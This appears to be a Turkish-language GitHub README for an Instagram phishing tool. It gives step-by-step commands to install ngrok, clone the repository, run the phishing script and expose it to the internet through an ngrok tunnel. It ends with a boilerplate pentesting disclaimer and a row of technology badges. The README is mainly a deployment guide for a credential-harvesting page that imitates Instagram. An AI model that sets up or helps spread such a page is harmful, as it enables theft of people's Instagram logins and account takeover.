<a href="https://resmim.net/"><img src="https://resmim.net/cdn/2026/07/27/EdbuLW.jpg" alt="resim yükle" border="0" /></a>

# INSTAGRAM-PHISHING

Bu proje yerel bir sunucu üzerinde çalışan bir instagram oltalama sayfasıdır. İnternet üzerinden erişilebilir hale getirmek için **ngrok** kullanılır.

## Gereksinimler
- Programı çalıştırmak için gerekli ortam (Python, Node.js vb. – projenize göre)
- [ngrok](https://ngrok.com) hesabı (ücretsiz)
- 
## 1. ngrok Kurulumu

### Hesap Oluşturma

1. [https://ngrok.com](https://ngrok.com) adresine gidin ve ücretsiz hesap oluşturun.
2. Giriş yaptıktan sonra **Dashboard** → **Your Authtoken** bölümünden authtoken’inizi kopyalayın.

### Linux terminalde ngrok kurulumu
```
- wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
- sudo tar xvzf ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
```
### Ngrok versiyon kontorlü için;

```
- ngrok version
```
### Terminalinize ngrok üzerinden aldığınız ngrok tokenini aktif edin

```
- ngrok config add-authtoken TRY_TOKEN
```
### Phishing programını çalıştırma;
```
1. Açtığınız terminale bu komutları girin ve programı aktif edin

- git clone https://github.com/ghost0x02/instagram-phishing
- cd instagram phishing
- python3 instagram-phishing.py start
```
```
2. Açtığınız terminale bu kodu girin

- ngrok http 5000
- Açılan ngrok sayfasından; https://2f74-31-206-163-190.ngrok-free.app
Bu kodu kopyalayın. Artık phishing sayfanız hazır.
```
## ⚖️ Yasal Uyarı / Disclaimer
**TR:** Bu araç yalnızca yasal sızma testleri ve eğitim faaliyetleri amacıyla geliştirilmiştir. İzin alınmamış hedef sistemler üzerinde kullanılması yasal sorumluluk doğurabilir. Kullanıcı, aracın kullanımından doğabilecek tüm hukuki sonuçlardan kendisi sorumludur.

**EN:** This software is strictly developed for authorized penetration testing, security auditing, and educational practices. Unauthorized deployment against remote infrastructure is highly illegal and carries strict judicial consequences.

**Developer:** `GHOST0X02` | **Version:** `1.0-Elite`
<p align="left"> <a href="https://aws.amazon.com" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/amazonwebservices/amazonwebservices-original-wordmark.svg" alt="aws" width="40" height="40"/> </a> <a href="https://www.gnu.org/software/bash/" target="_blank" rel="noreferrer"> <img src="https://www.vectorlogo.zone/logos/gnu_bash/gnu_bash-icon.svg" alt="bash" width="40" height="40"/> </a> <a href="https://www.w3schools.com/css/" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/css3/css3-original-wordmark.svg" alt="css3" width="40" height="40"/> </a> <a href="https://www.djangoproject.com/" target="_blank" rel="noreferrer"> <img src="https://cdn.worldvectorlogo.com/logos/django.svg" alt="django" width="40" height="40"/> </a> <a href="https://dotnet.microsoft.com/" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/dot-net/dot-net-original-wordmark.svg" alt="dotnet" width="40" height="40"/> </a> <a href="https://flask.palletsprojects.com/" target="_blank" rel="noreferrer"> <img src="https://www.vectorlogo.zone/logos/pocoo_flask/pocoo_flask-icon.svg" alt="flask" width="40" height="40"/> </a> <a href="https://cloud.google.com" target="_blank" rel="noreferrer"> <img src="https://www.vectorlogo.zone/logos/google_cloud/google_cloud-icon.svg" alt="gcp" width="40" height="40"/> </a> <a href="https://www.w3.org/html/" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/html5/html5-original-wordmark.svg" alt="html5" width="40" height="40"/> </a> <a href="https://www.adobe.com/in/products/illustrator.html" target="_blank" rel="noreferrer"> <img src="https://www.vectorlogo.zone/logos/adobe_illustrator/adobe_illustrator-icon.svg" alt="illustrator" width="40" height="40"/> </a> <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/javascript/javascript-original.svg" alt="javascript" width="40" height="40"/> </a> <a href="https://www.linux.org/" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/linux/linux-original.svg" alt="linux" width="40" height="40"/> </a> <a href="https://www.microsoft.com/en-us/sql-server" target="_blank" rel="noreferrer"> <img src="https://www.svgrepo.com/show/303229/microsoft-sql-server-logo.svg" alt="mssql" width="40" height="40"/> </a> <a href="https://www.mysql.com/" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/mysql/mysql-original-wordmark.svg" alt="mysql" width="40" height="40"/> </a> <a href="https://www.nginx.com" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/nginx/nginx-original.svg" alt="nginx" width="40" height="40"/> </a> <a href="https://www.photoshop.com/en" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/photoshop/photoshop-line.svg" alt="photoshop" width="40" height="40"/> </a> <a href="https://www.php.net" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/php/php-original.svg" alt="php" width="40" height="40"/> </a> <a href="https://www.python.org" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/python/python-original.svg" alt="python" width="40" height="40"/> </a> <a href="https://www.qt.io/" target="_blank" rel="noreferrer"> <img src="https://upload.wikimedia.org/wikipedia/commons/0/0b/Qt_logo_2016.svg" alt="qt" width="40" height="40"/> </a> <a href="https://unity.com/" target="_blank" rel="noreferrer"> <img src="https://www.vectorlogo.zone/logos/unity3d/unity3d-icon.svg" alt="unity" width="40" height="40"/> </a> </p> 






